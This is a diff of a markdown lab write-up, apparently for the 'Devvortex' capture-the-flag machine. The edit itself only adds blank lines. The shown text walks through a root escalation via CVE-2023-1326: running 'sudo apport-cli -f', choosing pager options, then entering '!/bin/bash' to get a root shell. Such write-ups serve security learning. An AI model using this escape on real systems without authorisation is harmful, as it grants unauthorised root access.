@@ -693,20 +693,25 @@ Here's the reference to exploit `apport-cli` with `sudo` permission:
 https://github.com/n3rdh4x0r/CVE-2023-1326?tab=readme-ov-file
 
 First, let's run the executable with `-f` option :
+
 ```
 sudo /usr/bin/apport-cli -f
 ```
 
 Then, select display for the choice :
+
 ![](attachments/devvortex_14.png)
 
 Then, put `2` on the next input :
+
 ![](attachments/devvortex_15.png)
 
 Then, we have to put `V` for the next choice :
+
 ![](attachments/devvortex_16.png)
 
 The last thing I need to do is put the following commands :
+
 ```bash
 !id
 !/bin/bash
